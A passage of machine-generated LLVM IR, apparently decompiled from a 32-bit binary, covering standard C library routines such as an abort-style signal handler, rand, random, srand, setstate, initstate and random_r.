  %v2_80546ab = mul i32 %v1_80546b619, 4
  %v3_80546ab = add i32 %v2_80546ab, 152
  %v4_80546ab = add i32 %v3_80546ab, %v0_80546ab
  %v5_80546ab = inttoptr i32 %v4_80546ab to i32*
  store i32 0, i32* %v5_80546ab, align 4
  %v0_80546b6.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_80546b6 = add i32 %v0_80546b6.pre, -1
  %v9_80546b6 = icmp slt i32 %v1_80546b6, 0
  store i32 %v1_80546b6, i32* %eax.global-to-local, align 4
  %v1_80546b7 = icmp eq i1 %v9_80546b6, false
  br i1 %v1_80546b7, label %dec_label_pc_80546ab.dec_label_pc_80546ab_crit_edge, label %dec_label_pc_80546b9

dec_label_pc_80546ab.dec_label_pc_80546ab_crit_edge: ; preds = %dec_label_pc_80546ab
  %v0_80546ab.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80546ab

dec_label_pc_80546b9:                             ; preds = %dec_label_pc_80546ab
  %v0_80546b9 = load i32, i32* @ebx, align 4
  %v2_80546bd = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_80546bd, i32* @ebx, align 4
  %v4_80546c5 = call i32 @__sigaddset(i32 %v2_80546bd, i32 6, i32 %v0_80546b9, i32 %v0_80546b9)
  store i32 %v4_80546c5, i32* %eax.global-to-local, align 4
  %v1_80546cd = icmp eq i32 %v4_80546c5, 0
  %v1_80546cf = icmp eq i1 %v1_80546cd, false
  br i1 %v1_80546cf, label %dec_label_pc_80546df, label %dec_label_pc_80546d1

dec_label_pc_80546d1:                             ; preds = %dec_label_pc_80546b9
  %v3_80546d7 = bitcast i32* %stack_var_-132 to %_TYPEDEF_sigset_t*
  %v4_80546d7 = call i32 @__GI_sigprocmask(i32 1, %_TYPEDEF_sigset_t* %v3_80546d7, i32 0)
  store i32 %v4_80546d7, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80546df

dec_label_pc_80546df:                             ; preds = %dec_label_pc_80546b9, %dec_label_pc_80546d1
  %v2_80547174 = phi i32 [ %v4_80546c5, %dec_label_pc_80546b9 ], [ %v4_80546d7, %dec_label_pc_80546d1 ]
  %v0_80546df = load i8, i8* @global_var_8062760.523, align 32
  %v1_80546df = icmp eq i8 %v0_80546df, 0
  %v1_80546e6 = icmp eq i1 %v1_80546df, false
  br i1 %v1_80546e6, label %dec_label_pc_8054717, label %dec_label_pc_80546e8

dec_label_pc_80546e8:                             ; preds = %dec_label_pc_80546df
  store i8 1, i8* @global_var_8062760.523, align 32
  br label %dec_label_pc_80546ef

dec_label_pc_80546ef:                             ; preds = %dec_label_pc_8054756, %dec_label_pc_80546e8
  %v1_80546f7 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805c3e8.522 to i32))
  store i32 %v1_80546f7, i32* %eax.global-to-local, align 4
  %v1_8054703 = call i32 @__raise(i32 6)
  store i32 %v1_8054703, i32* %eax.global-to-local, align 4
  %v1_805470f = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805c3e8.522 to i32))
  store i32 %v1_805470f, i32* %eax.global-to-local, align 4
  %v0_8054717.pre = load i8, i8* @global_var_8062760.523, align 32
  br label %dec_label_pc_8054717

dec_label_pc_8054717:                             ; preds = %dec_label_pc_80546df, %dec_label_pc_80546ef
  %v2_8054717 = phi i32 [ %v2_80547174, %dec_label_pc_80546df ], [ %v1_805470f, %dec_label_pc_80546ef ]
  %v0_8054717 = phi i8 [ %v0_80546df, %dec_label_pc_80546df ], [ %v0_8054717.pre, %dec_label_pc_80546ef ]
  %v1_8054717 = zext i8 %v0_8054717 to i32
  %v3_8054717 = and i32 %v2_8054717, -256
  %v4_8054717 = or i32 %v1_8054717, %v3_8054717
  store i32 %v4_8054717, i32* %eax.global-to-local, align 4
  %v10_805471c = icmp eq i8 %v0_8054717, 1
  %v1_805471e = icmp eq i1 %v10_805471c, false
  br i1 %v1_805471e, label %dec_label_pc_8054778, label %dec_label_pc_8054720

dec_label_pc_8054720:                             ; preds = %dec_label_pc_8054717
  %v2_8054728 = ptrtoint i32* %stack_var_-272 to i32
  store i32 %v2_8054728, i32* %eax.global-to-local, align 4
  store i8 2, i8* @global_var_8062760.523, align 32
  %v3_8054734 = bitcast i32* %stack_var_-272 to i8*
  %v4_8054734 = call i32 @__GI_memset(i8* %v3_8054734, i32 0, i32 140)
  store i32 0, i32* %stack_var_-272, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805474b

dec_label_pc_805474b:                             ; preds = %dec_label_pc_805474b.dec_label_pc_805474b_crit_edge, %dec_label_pc_8054720
  %v0_805474b = phi i32 [ %v12_80546a6, %dec_label_pc_8054720 ], [ %v0_805474b.pre, %dec_label_pc_805474b.dec_label_pc_805474b_crit_edge ]
  %v1_805475318 = phi i32 [ 31, %dec_label_pc_8054720 ], [ %v1_8054753, %dec_label_pc_805474b.dec_label_pc_805474b_crit_edge ]
  %v2_805474b = mul i32 %v1_805475318, 4
  %v3_805474b = add i32 %v2_805474b, 16
  %v4_805474b = add i32 %v3_805474b, %v0_805474b
  %v5_805474b = inttoptr i32 %v4_805474b to i32*
  store i32 -1, i32* %v5_805474b, align 4
  %v0_8054753.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_8054753 = add i32 %v0_8054753.pre, -1
  %v9_8054753 = icmp slt i32 %v1_8054753, 0
  store i32 %v1_8054753, i32* %eax.global-to-local, align 4
  %v1_8054754 = icmp eq i1 %v9_8054753, false
  br i1 %v1_8054754, label %dec_label_pc_805474b.dec_label_pc_805474b_crit_edge, label %dec_label_pc_8054756

dec_label_pc_805474b.dec_label_pc_805474b_crit_edge: ; preds = %dec_label_pc_805474b
  %v0_805474b.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805474b

dec_label_pc_8054756:                             ; preds = %dec_label_pc_805474b
  store i32 %v2_8054728, i32* %eax.global-to-local, align 4
  %v4_805476b = call i32 @__libc_sigaction(i32 6, i32* nonnull %stack_var_-272, i32 0)
  store i32 %v4_805476b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80546ef

dec_label_pc_8054778:                             ; preds = %dec_label_pc_8054717
  %v10_8054778 = icmp eq i8 %v0_8054717, 2
  %v1_805477a = icmp eq i1 %v10_8054778, false
  br i1 %v1_805477a, label %dec_label_pc_8054784, label %dec_label_pc_805477c

dec_label_pc_805477c:                             ; preds = %dec_label_pc_8054778
  store i8 3, i8* @global_var_8062760.523, align 32
  br label %dec_label_pc_8054784

dec_label_pc_8054784:                             ; preds = %dec_label_pc_8054778, %dec_label_pc_805477c
  %v0_8054784 = phi i8 [ %v0_8054717, %dec_label_pc_8054778 ], [ 3, %dec_label_pc_805477c ]
  %v9_8054784 = icmp eq i8 %v0_8054784, 3
  %v1_805478b = icmp eq i1 %v9_8054784, false
  br i1 %v1_805478b, label %dec_label_pc_805479e, label %dec_label_pc_805478d

dec_label_pc_805478d:                             ; preds = %dec_label_pc_8054784
  store i8 4, i8* @global_var_8062760.523, align 32
  %v1_8054799 = call i32 @__GI__exit(i32 127)
  unreachable

dec_label_pc_805479e:                             ; preds = %dec_label_pc_8054784, %dec_label_pc_805479e
  br label %dec_label_pc_805479e

; uselistorder directives
  uselistorder i32 %v1_8054753, { 2, 1, 0 }
  uselistorder i8 %v0_8054717, { 2, 0, 1, 3 }
  uselistorder i32 %v1_80546b6, { 2, 1, 0 }
  uselistorder i32* %stack_var_-272, { 0, 2, 1, 3 }
  uselistorder i32* %eax.global-to-local, { 2, 3, 5, 4, 0, 6, 7, 8, 9, 10, 11, 12, 14, 13, 1 }
  uselistorder i8 3, { 0, 4, 6, 1, 2, 5, 3 }
  uselistorder i8* @global_var_8062760.523, { 5, 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_805479e, { 1, 0 }
  uselistorder label %dec_label_pc_8054784, { 1, 0 }
  uselistorder label %dec_label_pc_8054717, { 1, 0 }
  uselistorder label %dec_label_pc_80546df, { 1, 0 }
}

define i32 @rand() local_unnamed_addr {
entry:
  %v0_80547a4 = call i32 @random()
  ret i32 %v0_80547a4

; uselistorder directives
  uselistorder i32 ()* @random, { 10, 3, 0, 7, 2, 1, 6, 5, 4, 9, 8 }
}

define i32 @random() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80547ac = load i32, i32* @ebx, align 4
  store i32 %v0_80547ac, i32* %stack_var_-4, align 4
  %v2_80547ba = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_80547ba, i32* @ebx, align 4
  %v2_80547bf = call i32 @__pthread_return_void(i32 %v2_80547ba, i32 134566343)
  %v1_80547cb = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805c400.524 to i32))
  %v2_80547d2 = ptrtoint i32* %stack_var_-8 to i32
  %v3_80547dc = call i32 @__GI_random_r(i32* nonnull @global_var_805c418, i32 %v2_80547d2)
  store i32 ptrtoint (i32* @global_var_805c418 to i32), i32* @eax, align 4
  %v2_80547e6 = call i32 @__pthread_return_void(i32 %v2_80547ba, i32 1)
  %v3_80547eb = load i32, i32* %stack_var_-8, align 4
  %v2_80547f2 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80547f2, i32* @ebx, align 4
  ret i32 %v3_80547eb
}

define i32 @setstate(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 0, i32* @esi, align 4
  %v2_8054805 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8054805, i32* @eax, align 4
  %v2_805480a = call i32 @__pthread_return_void(i32 %v2_8054805, i32 134566343)
  %v1_8054816 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805c400.524 to i32))
  %v0_805481b = load i32, i32* bitcast (i32** @global_var_805c420.527 to i32*), align 32
  store i32 %v0_805481b, i32* @ebx, align 4
  %v3_805482c = call i32 @setstate_r(i32 %arg1, i32* nonnull @global_var_805c418)
  %v2_8054834 = icmp slt i32 %v3_805482c, 0
  br i1 %v2_8054834, label %dec_label_pc_805483b, label %dec_label_pc_8054838

dec_label_pc_8054838:                             ; preds = %entry
  store i32 ptrtoint (i32** @global_var_805c41c.528 to i32), i32* @esi, align 4
  br label %dec_label_pc_805483b

dec_label_pc_805483b:                             ; preds = %entry, %dec_label_pc_8054838
  store i32 %v2_8054805, i32* @eax, align 4
  %v2_8054844 = call i32 @__pthread_return_void(i32 %v2_8054805, i32 1)
  %v0_805484c = load i32, i32* @esi, align 4
  ret i32 %v0_805484c

; uselistorder directives
  uselistorder label %dec_label_pc_805483b, { 1, 0 }
}

define i32 @initstate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v2_8054860 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8054860, i32* @ebx, align 4
  %v2_8054865 = call i32 @__pthread_return_void(i32 %v2_8054860, i32 134566343)
  %v1_8054871 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805c400.524 to i32))
  store i32 ptrtoint (i32** @global_var_805c41c.528 to i32), i32* @esi, align 4
  %v4_8054890 = inttoptr i32 %arg2 to i32*
  %v5_8054890 = call i32 @__GI_initstate_r(i32 %arg1, i32* %v4_8054890, i32 %arg3, i32 ptrtoint (i32* @global_var_805c418 to i32))
  store i32 %v5_8054890, i32* @eax, align 4
  %v2_805489b = call i32 @__pthread_return_void(i32 %v2_8054860, i32 1)
  %v0_80548a3 = load i32, i32* @esi, align 4
  ret i32 %v0_80548a3
}

define i32 @srand(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80548a8 = load i32, i32* @ebx, align 4
  store i32 %v0_80548a8, i32* %stack_var_-4, align 4
  %v2_80548b6 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_80548b6, i32* @ebx, align 4
  %v2_80548bb = call i32 @__pthread_return_void(i32 %v2_80548b6, i32 134566343)
  %v1_80548c7 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805c400.524 to i32))
  %v3_80548d7 = call i32 @srandom_r(i32 %arg1, i32* nonnull @global_var_805c418)
  store i32 ptrtoint (i32* @global_var_805c418 to i32), i32* @eax, align 4
  %v2_80548e1 = call i32 @__pthread_return_void(i32 %v2_80548b6, i32 1)
  %v2_80548e9 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80548e9, i32* @ebx, align 4
  ret i32 %v2_80548e1

; uselistorder directives
  uselistorder i32 ptrtoint (i32* @global_var_805c418 to i32), { 1, 2, 0 }
  uselistorder i32* @global_var_805c418, { 0, 1, 3, 2 }
}

define i32 @setstate_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg2 to i32
  %v0_80548ef = load i32, i32* @ebx, align 4
  store i32 %tmp3, i32* %ebx.global-to-local, align 4
  store i32 %arg1, i32* %esi.global-to-local, align 4
  %v1_80548fb = add i32 %tmp3, 12
  %v2_80548fb = inttoptr i32 %v1_80548fb to i32*
  %v3_80548fb = load i32, i32* %v2_80548fb, align 4
  store i32 %v3_80548fb, i32* %ecx.global-to-local, align 4
  %v1_80548fe = add i32 %arg1, 4
  store i32 %v1_80548fe, i32* %esi.global-to-local, align 4
  %v1_8054901 = add i32 %tmp3, 8
  %v2_8054901 = inttoptr i32 %v1_8054901 to i32*
  %v3_8054901 = load i32, i32* %v2_8054901, align 4
  %v1_8054904 = icmp eq i32 %v3_80548fb, 0
  %v1_8054906 = icmp eq i1 %v1_8054904, false
  br i1 %v1_8054906, label %dec_label_pc_8054911, label %dec_label_pc_8054908

dec_label_pc_8054908:                             ; preds = %entry
  %v1_8054908 = add i32 %v3_8054901, -4
  %v2_8054908 = inttoptr i32 %v1_8054908 to i32*
  store i32 0, i32* %v2_8054908, align 4
  br label %dec_label_pc_8054921

dec_label_pc_8054911:                             ; preds = %entry
  %v1_8054911 = add i32 %tmp3, 4
  %v2_8054911 = inttoptr i32 %v1_8054911 to i32*
  %v3_8054911 = load i32, i32* %v2_8054911, align 4
  %v2_8054914 = sub i32 %v3_8054911, %v3_8054901
  %v2_8054916 = sdiv i32 %v2_8054914, 4
  %v3_8054919 = mul i32 %v2_8054916, 5
  %v2_805491c = add i32 %v3_8054919, %v3_80548fb
  store i32 %v2_805491c, i32* %eax.global-to-local, align 4
  %v2_805491e = add i32 %v3_8054901, -4
  %v3_805491e = inttoptr i32 %v2_805491e to i32*
  store i32 %v2_805491c, i32* %v3_805491e, align 4
  br label %dec_label_pc_8054921

dec_label_pc_8054921:                             ; preds = %dec_label_pc_8054908, %dec_label_pc_8054911
  %v0_8054921 = load i32, i32* %esi.global-to-local, align 4
  %v1_8054921 = add i32 %v0_8054921, -4
  %v2_8054921 = inttoptr i32 %v1_8054921 to i32*
  %v3_8054921 = load i32, i32* %v2_8054921, align 4
  store i32 5, i32* %edi.global-to-local, align 4
  %v1_8054929 = ashr i32 %v3_8054921, 31
  %v2_805492a = zext i32 %v3_8054921 to i64
  %v4_805492a = zext i32 %v1_8054929 to i64
  %v5_805492a = mul nuw i64 %v4_805492a, 4294967296
  %v6_805492a = or i64 %v5_805492a, %v2_805492a
  %v8_805492a = sdiv i64 %v6_805492a, 5
  %v9_805492a = trunc i64 %v8_805492a to i32
  store i32 %v9_805492a, i32* %eax.global-to-local, align 4
  %v10_805492a = srem i64 %v6_805492a, 5
  %v11_805492a = trunc i64 %v10_805492a to i32
  %v6_805492f = icmp ugt i32 %v11_805492a, 4
  br i1 %v6_805492f, label %dec_label_pc_805496f, label %dec_label_pc_8054931

dec_label_pc_8054931:                             ; preds = %dec_label_pc_8054921
  %v1_8054931 = mul i32 %v11_805492a, 4
  %v2_8054931 = add i32 %v1_8054931, ptrtoint (i32* @global_var_805ae74.529 to i32)
  %v3_8054931 = inttoptr i32 %v2_8054931 to i32*
  %v4_8054931 = load i32, i32* %v3_8054931, align 4
  store i32 %v4_8054931, i32* %ecx.global-to-local, align 4
  %v1_8054938 = icmp eq i32 %v11_805492a, 0
  %v2_805493a = add i32 %v1_8054931, ptrtoint (i32* @global_var_805ae60.530 to i32)
  %v3_805493a = inttoptr i32 %v2_805493a to i32*
  %v4_805493a = load i32, i32* %v3_805493a, align 4
  store i32 %v4_805493a, i32* %ebp.global-to-local, align 4
  %v1_8054941 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054941 = add i32 %v1_8054941, 12
  %v3_8054941 = inttoptr i32 %v2_8054941 to i32*
  store i32 %v11_805492a, i32* %v3_8054941, align 4
  %v0_8054944 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8054944 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054944 = add i32 %v1_8054944, 16
  %v3_8054944 = inttoptr i32 %v2_8054944 to i32*
  store i32 %v0_8054944, i32* %v3_8054944, align 4
  %v0_8054947 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8054947 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054947 = add i32 %v1_8054947, 20
  %v3_8054947 = inttoptr i32 %v2_8054947 to i32*
  store i32 %v0_8054947, i32* %v3_8054947, align 4
  br i1 %v1_8054938, label %dec_label_pc_8054962, label %dec_label_pc_805494c

dec_label_pc_805494c:                             ; preds = %dec_label_pc_8054931
  %v0_805494c = load i32, i32* %esi.global-to-local, align 4
  %v1_805494c = add i32 %v0_805494c, -4
  %v2_805494c = inttoptr i32 %v1_805494c to i32*
  %v3_805494c = load i32, i32* %v2_805494c, align 4
  %v1_805494f = ashr i32 %v3_805494c, 31
  %v0_8054950 = load i32, i32* %edi.global-to-local, align 4
  %v2_8054950 = zext i32 %v3_805494c to i64
  %v4_8054950 = zext i32 %v1_805494f to i64
  %v5_8054950 = mul nuw i64 %v4_8054950, 4294967296
  %v6_8054950 = or i64 %v5_8054950, %v2_8054950
  %v7_8054950 = zext i32 %v0_8054950 to i64
  %v8_8054950 = sdiv i64 %v6_8054950, %v7_8054950
  %v9_8054950 = trunc i64 %v8_8054950 to i32
  %v2_8054952 = mul i32 %v9_8054950, 4
  %v3_8054952 = add i32 %v2_8054952, %v0_805494c
  %v1_8054955 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8054955 = add i32 %v1_8054955, %v9_8054950
  store i32 %v2_8054955, i32* %eax.global-to-local, align 4
  %v1_8054957 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054957 = add i32 %v1_8054957, 4
  %v3_8054957 = inttoptr i32 %v2_8054957 to i32*
  store i32 %v3_8054952, i32* %v3_8054957, align 4
  %v0_805495a = load i32, i32* %eax.global-to-local, align 4
  %v1_805495a = ashr i32 %v0_805495a, 31
  %v0_805495b = load i32, i32* %ecx.global-to-local, align 4
  %v2_805495b = zext i32 %v0_805495a to i64
  %v4_805495b = zext i32 %v1_805495a to i64
  %v5_805495b = mul nuw i64 %v4_805495b, 4294967296
  %v6_805495b = or i64 %v5_805495b, %v2_805495b
  %v7_805495b = zext i32 %v0_805495b to i64
  %v8_805495b = sdiv i64 %v6_805495b, %v7_805495b
  %v9_805495b = trunc i64 %v8_805495b to i32
  store i32 %v9_805495b, i32* %eax.global-to-local, align 4
  %v10_805495b = srem i64 %v6_805495b, %v7_805495b
  %v11_805495b = trunc i64 %v10_805495b to i32
  %v0_805495d = load i32, i32* %esi.global-to-local, align 4
  %v2_805495d = mul i32 %v11_805495b, 4
  %v3_805495d = add i32 %v2_805495d, %v0_805495d
  %v1_8054960 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054960 = inttoptr i32 %v1_8054960 to i32*
  store i32 %v3_805495d, i32* %v2_8054960, align 4
  br label %dec_label_pc_8054962

dec_label_pc_8054962:                             ; preds = %dec_label_pc_8054931, %dec_label_pc_805494c
  %v0_8054962 = load i32, i32* %esi.global-to-local, align 4
  %v1_8054962 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8054962 = mul i32 %v1_8054962, 4
  %v3_8054962 = add i32 %v2_8054962, %v0_8054962
  %v1_8054965 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054965 = add i32 %v1_8054965, 24
  %v3_8054965 = inttoptr i32 %v2_8054965 to i32*
  store i32 %v3_8054962, i32* %v3_8054965, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_805496a = load i32, i32* %esi.global-to-local, align 4
  %v1_805496a = load i32, i32* %ebx.global-to-local, align 4
  %v2_805496a = add i32 %v1_805496a, 8
  %v3_805496a = inttoptr i32 %v2_805496a to i32*
  store i32 %v0_805496a, i32* %v3_805496a, align 4
  %v0_8054984.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805497d

dec_label_pc_805496f:                             ; preds = %dec_label_pc_8054921
  %v1_805496f = call i32 @__errno_location(i32 %v0_80548ef)
  %v1_8054974 = inttoptr i32 %v1_805496f to i32*
  store i32 22, i32* %v1_8054974, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805497d

dec_label_pc_805497d:                             ; preds = %dec_label_pc_8054962, %dec_label_pc_805496f
  %v0_8054984 = phi i32 [ %v0_8054984.pre, %dec_label_pc_8054962 ], [ -1, %dec_label_pc_805496f ]
  store i32 %v0_80548ef, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8054984

; uselistorder directives
  uselistorder i32 %v11_805492a, { 1, 3, 2, 0 }
  uselistorder i32 %tmp3, { 0, 1, 3, 2 }
  uselistorder i64 5, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805497d, { 1, 0 }
  uselistorder label %dec_label_pc_8054962, { 1, 0 }
  uselistorder label %dec_label_pc_8054921, { 1, 0 }
}

define i32 @__GI_random_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v0_8054988 = load i32, i32* @ebx, align 4
  store i32 %v0_8054988, i32* %stack_var_-16, align 4
  store i32 %tmp3, i32* %ebx.global-to-local, align 4
  store i32 %arg2, i32* %ebp.global-to-local, align 4
  %v1_8054991 = add i32 %tmp3, 12
  %v2_8054991 = inttoptr i32 %v1_8054991 to i32*
  %v3_8054991 = load i32, i32* %v2_8054991, align 4
  %v4_8054991 = icmp eq i32 %v3_8054991, 0
  %v1_8054995 = add i32 %tmp3, 8
  %v2_8054995 = inttoptr i32 %v1_8054995 to i32*
  %v3_8054995 = load i32, i32* %v2_8054995, align 4
  store i32 %v3_8054995, i32* %esi.global-to-local, align 4
  %v1_8054998 = icmp eq i1 %v4_8054991, false
  br i1 %v1_8054998, label %dec_label_pc_80549b1, label %dec_label_pc_805499a

dec_label_pc_805499a:                             ; preds = %entry
  %v2_805499a = inttoptr i32 %v3_8054995 to i32*
  %v3_805499a = load i32, i32* %v2_805499a, align 4
  %v5_805499a = mul i32 %v3_805499a, 1103515245
  %v1_80549a0 = add i32 %v5_805499a, 12345
  %v1_80549a5 = urem i32 %v1_80549a0, -2147483648
  store i32 %v1_80549a5, i32* %eax.global-to-local, align 4
  store i32 %v1_80549a5, i32* %v2_805499a, align 4
  %v0_80549ac = load i32, i32* %eax.global-to-local, align 4
  %v1_80549ac = load i32, i32* %ebp.global-to-local, align 4
  %v2_80549ac = inttoptr i32 %v1_80549ac to i32*
  store i32 %v0_80549ac, i32* %v2_80549ac, align 4
  br label %dec_label_pc_80549dc

dec_label_pc_80549b1:                             ; preds = %entry
  %v1_80549b1 = add i32 %tmp3, 4
  %v2_80549b1 = inttoptr i32 %v1_80549b1 to i32*
  %v3_80549b1 = load i32, i32* %v2_80549b1, align 4
  store i32 %v3_80549b1, i32* %ecx.global-to-local, align 4
  %v2_80549b4 = load i32, i32* %arg1, align 4
  store i32 %v2_80549b4, i32* %edx.global-to-local, align 4
  %v1_80549b6 = add i32 %tmp3, 24
  %v2_80549b6 = inttoptr i32 %v1_80549b6 to i32*
  %v3_80549b6 = load i32, i32* %v2_80549b6, align 4
  store i32 %v3_80549b6, i32* %edi.global-to-local, align 4
  %v1_80549b9 = inttoptr i32 %v3_80549b1 to i32*
  %v2_80549b9 = load i32, i32* %v1_80549b9, align 4
  store i32 %v2_80549b9, i32* %eax.global-to-local, align 4
  %v1_80549bb = inttoptr i32 %v2_80549b4 to i32*
  %v2_80549bb = load i32, i32* %v1_80549bb, align 4
  %v4_80549bb = add i32 %v2_80549bb, %v2_80549b9
  store i32 %v4_80549bb, i32* %v1_80549bb, align 4
  %v0_80549bd = load i32, i32* %edx.global-to-local, align 4
  %v1_80549bd = inttoptr i32 %v0_80549bd to i32*
  %v2_80549bd = load i32, i32* %v1_80549bd, align 4
  %v1_80549bf = add i32 %v0_80549bd, 4
  store i32 %v1_80549bf, i32* %edx.global-to-local, align 4
  %v2_80549c2 = udiv i32 %v2_80549bd, 2
  %v1_80549c4 = load i32, i32* %edi.global-to-local, align 4
  %v7_80549c4 = icmp ult i32 %v1_80549bf, %v1_80549c4
  %v1_80549c6 = load i32, i32* %ebp.global-to-local, align 4
  %v2_80549c6 = inttoptr i32 %v1_80549c6 to i32*
  store i32 %v2_80549c2, i32* %v2_80549c6, align 4
  %v0_80549c9 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80549c9 = add i32 %v0_80549c9, 4
  store i32 %v1_80549c9, i32* %eax.global-to-local, align 4
  br i1 %v7_80549c4, label %dec_label_pc_80549d2, label %dec_label_pc_80549ce

dec_label_pc_80549ce:                             ; preds = %dec_label_pc_80549b1
  %v0_80549ce = load i32, i32* %esi.global-to-local, align 4
  store i32 %v0_80549ce, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80549d7

dec_label_pc_80549d2:                             ; preds = %dec_label_pc_80549b1
  %v1_80549d2 = load i32, i32* %edi.global-to-local, align 4
  %v7_80549d2 = icmp ult i32 %v1_80549c9, %v1_80549d2
  %v1_80549d4 = icmp eq i1 %v7_80549d2, false
  %v3_80549d4 = load i32, i32* %esi.global-to-local, align 4
  %v4_80549d4 = select i1 %v1_80549d4, i32 %v3_80549d4, i32 %v1_80549c9
  store i32 %v4_80549d4, i32* %eax.global-to-local, align 4
  %v0_80549d7.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80549d7

dec_label_pc_80549d7:                             ; preds = %dec_label_pc_80549ce, %dec_label_pc_80549d2
  %v0_80549d7 = phi i32 [ %v0_80549ce, %dec_label_pc_80549ce ], [ %v0_80549d7.pre, %dec_label_pc_80549d2 ]
  %v1_80549d7 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80549d7 = inttoptr i32 %v1_80549d7 to i32*
  store i32 %v0_80549d7, i32* %v2_80549d7, align 4
  %v0_80549d9 = load i32, i32* %eax.global-to-local, align 4
  %v1_80549d9 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80549d9 = add i32 %v1_80549d9, 4
  %v3_80549d9 = inttoptr i32 %v2_80549d9 to i32*
  store i32 %v0_80549d9, i32* %v3_80549d9, align 4
  br label %dec_label_pc_80549dc

dec_label_pc_80549dc:                             ; preds = %dec_label_pc_805499a, %dec_label_pc_80549d7
  %v2_80549dc = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_80549dc, i32* @ebx, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_80549a5, { 1, 0 }
  uselistorder i32 %tmp3, { 0, 1, 2, 4, 3 }
  uselistorder i32* %edx.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32* %eax.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_80549dc, { 1, 0 }
  uselistorder label %dec_label_pc_80549d7, { 1, 0 }
}

define i32 @srandom_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp14 = ptrtoint i32* %arg2 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-40 = alloca i64, align 8
  %v0_80549e3 = load i32, i32* @ebp, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_80549e7 = load i32, i32* @edi, align 4
  %v0_80549e8 = load i32, i32* @esi, align 4
  %v0_80549e9 = load i32, i32* @ebx, align 4
  store i32 %tmp14, i32* @esi, align 4
  store i32 %arg1, i32* %edx.global-to-local, align 4
  %v1_80549f5 = add i32 %tmp14, 12
  %v2_80549f5 = inttoptr i32 %v1_80549f5 to i32*
  %v3_80549f5 = load i32, i32* %v2_80549f5, align 4
  store i32 %v3_80549f5, i32* %ecx.global-to-local, align 4
  %v6_80549fb = icmp ugt i32 %v3_80549f5, 4
  br i1 %v6_80549fb, label %dec_label_pc_8054a75, label %dec_label_pc_80549fd

dec_label_pc_80549fd:                             ; preds = %entry
  %v1_80549fd = add i32 %tmp14, 8
  %v2_80549fd = inttoptr i32 %v1_80549fd to i32*
  %v3_80549fd = load i32, i32* %v2_80549fd, align 4
  store i32 %v3_80549fd, i32* %ebx.global-to-local, align 4
